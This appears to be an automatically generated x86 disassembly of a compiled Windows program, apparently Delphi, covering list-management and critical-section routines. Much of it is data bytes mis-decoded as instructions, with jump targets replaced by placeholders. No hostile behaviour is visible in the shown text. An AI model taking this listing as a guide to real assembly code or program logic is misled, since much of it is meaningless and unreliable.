jb r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add al bl
xchg ebx eax
inc ecx
add ah dl
xchg edi eax
add [ eax + 0x68004031 ] ah
xchg edi eax
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax + ebx * 4 - 0x671bffbf ] dh
inc ecx
add ah bl
cwde
inc ecx
add [ eax ] dh
xchg edi eax
inc ecx
add [ edx ] al
add bh bh
aam 0x97
imul esi [ ebx + 0x74 ] 0xc0746e65
inc ecx
add al bh
inc cx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x4168
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x68a20041 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub_416e75
insb
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
shl [ ebx - 0x4be3ffbf ] 0x1
inc ecx
add [ esp + esi * 4 ] dh
inc ecx
add [ eax + 0x200041ba ] cl
sub al [ eax ]
sar [ edx - 0x4aa7ffbf ] 0x41
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
pop eax
mov ch 0x41
je r-xdata
push ebx
push ebx
add [ ebx + edi * 4 + 0x540d0041 ] dh
dec ebp
inc ecx
add [ eax - 0x4b ] bl
inc ecx
insd
dec ebp
insd
outsd
jb r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
nop
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x180041 ] ch
add [ eax ] al
dec esp
outsb
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
mov ebp 0xb3d00041
inc ecx
add [ esp + esi * 4 ] bl
jns r-xdata
push ebx
je r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
inc ecx
add [ esp + esi * 4 ] dh
inc ecx
add [ eax - 0x3ffbe46 ] cl
mov ebp 0xbac00041
inc ecx
add [ eax - 0x4b ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
shl [ ebx - 0x4be3ffbf ] 0x1
je r-xdata
insd
outsd
jb r-xdata
popad
insd
adc al 0x6f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] dh
inc ecx
add [ eax + eax ] dl
add [ eax ] al
dec esp
outsb
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah ah
mov edx 0xb3d00041
inc ecx
add [ eax + 0x340041bb ] cl
mov ah 0x41
add [ eax + 0x400041ba ] cl
mov esp 0xbac00041
sub_417076
push esi
jo r-xdata
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jbe r-xdata
add [ eax + 0x70 ] ah
inc ecx
add [ edx + 0x70 ] ch
inc ecx
add [ ebx ] bh
jo r-xdata
sub [ edx ] ah
inc edx
add [ edx ] dh
inc edx
add [ eax + 0x22 ] al
inc edx
add [ edx + 0x42 ] cl
add al cl
and al [ edx ]
push cs
push esp
push ebx
je r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
sbb al 0x71
inc ecx
add [ esi + 0x4170 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x71 ] cl
inc ecx
adc al 0x0
add [ eax + 0x70 ] cl
inc ecx
add [ ebp - 0x34ffbe91 ] bh
outsd
inc ecx
add cl bl
outsd
inc ecx
add bh ah
outsd
inc ecx
add ch dh
outsd
inc ecx
add [ ebx ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
jo r-xdata
jb r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + edi * 4 + 0x41 ] bl
add [ esi + edi * 4 + 0x2a200041 ] al
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jb r-xdata
jb r-xdata
add [ eax ] bl
add [ eax ] al
add [ edx + edx + 0x40 ] al
add [ esp + esi ] dh
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax + 0x2c004031 ] ah
push ds
inc edx
add [ esi + ebx + 0x42 ] ah
add ah cl
push ds
inc edx
add [ edi + ebx ] dh
inc edx
add [ eax + 0x1c00421f ] bh
and [ edx ] al
sbb al 0x22
inc edx
add [ eax ] ch
and al [ edx ]
xor al 0x22
add [ eax ] al
add [ edi ] bl
jo r-xdata
mov al [ 0x1c004031 ]
lds eax [ ecx ]
test [ esi - 0x3a83ffbf ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] al
salc
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
jo r-xdata
rol dh 0x41
add [ eax + ebp * 8 - 0x177bffbf ] bl
add [ eax - 0x3bffbe3b ] dh
enter 0x41 0xa0
mov [ ecx ] 0xcc
out 0x41 eax
add al al
mov [ ecx ] 0x9c
call 0xffffffffe8c572c7
add [ eax + eax ] bh
add [ ecx + esi * 2 + 0x34340041 ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax * 8 - 0x417bffbf ] bl
inc ecx
add [ ebp + eax * 8 + 0x41 ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jno r-xdata
add [ 0x1004170 ] ch
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
mov al [ 0xffffffff98004031 ]
add [ ecx ] 0x6c43540c
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x80041 ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0xc004181 ] bl
push esp
inc ebx
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
jb r-xdata
shl ah 0x72
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax ] al
jb r-xdata
mov ch ch
inc ecx
add [ eax - 0x13ffbe13 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
jae r-xdata
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41726490
mov al [ 0x5c004031 ]
mov esi 0xbe840041
inc ecx
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esi
je r-xdata
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] ch
in eax dx
inc ecx
add ah bl
int1
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
sub al 0x0
add [ eax + eax ] cl
add [ ecx + esi * 2 + 0x34340041 ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x13 ] dl
inc ecx
add [ eax ] dh
out dx al
inc ecx
add [ eax - 0x4fffbe13 ] cl
in eax dx
inc ecx
add ah ch
add al 0xd8
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
outsb
jb r-xdata
inc esp
and al 0x4
aam 0xe9

jns r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
nop
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x41 ] dh
shl [ eax + 0x73 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82d1d
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
jae r-xdata
popad
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
pop es
inc ebp
push esp
push 0x64616572
jl r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov eax [ eax ]
jmp [ eax + 0x28 ]
aam 0x8b
inc esp
and al 0x4
je r-xdata
outsb
outsb
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
dec [ ebx - 0x3f7c3340 ]
fsubr st1
das
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
add bh bh
pop ebp
retn 0x4
sub_417744
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060b4
pop edi
pop esi
pop ebx
retn
sub_41776c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406098
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_417794
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060d4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4177f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x41 ] bh
add [ eax + eax ] dl
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah dh
inc esp
xor al 0x40
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
nop
js r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4178a8
mov esi eax
jmp r-xdata
jns r-xdata
test [ ecx ] dh
inc eax
add [ eax - 0xbffbfcf ] ah
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov al [ 0x1c004031 ]
jge r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ edi * 2 + 0x540a0041 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004178 ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4178a8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403418
test al al
je r-xdata
call sub_418dc4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403418
test al al
je r-xdata
xlat
push edx
inc edi
jb r-xdata
add [ edx ] cl
push esp
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403418
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4178a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418dc4
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403418
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403418
test al al
je r-xdata
sub_417908
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4178a8
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4178a8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403418
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417978
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418c68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4179f4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
mov eax [ esi + 0x4 ]
call sub_4031ec
mov eax [ esi + 0x8 ]
call sub_4031ec
mov eax [ esi + 0xc ]
call sub_4031ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_417a34
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418dc4
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403150
test al al
jne r-xdata
sub_417a94
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418dc4
mov edx eax
mov eax ebp
call sub_403418
test al al
jne r-xdata
sub_417ad8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417b73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417a34
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b7a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
sub_417b98
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405224
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417bb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418dc4
mov edx edi
call sub_417b98
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418dc4
mov edx edi
call sub_417b98
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418cb4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417b98
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418cb4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417c5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418dc4
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417a94
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417ca8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417978
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418c68
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_417d1c
push ebx
push esi
push edi
push ebp
call sub_4035b8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418dc4
call sub_4031ec
inc edi
dec ebp
jne r-xdata
sub_417d78
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418dc4
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_417908
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417dbc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_417a34
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418dc4
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_417e00
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_417e83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40313c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e8a
lea eax [ ebp - 0x10c ]
call sub_403f7c
retn
sub_417e90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417d78
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_41789c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_417e00
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418dc4
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418dc4
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403418
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417d78
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cb4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418c68
sub_417f7c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
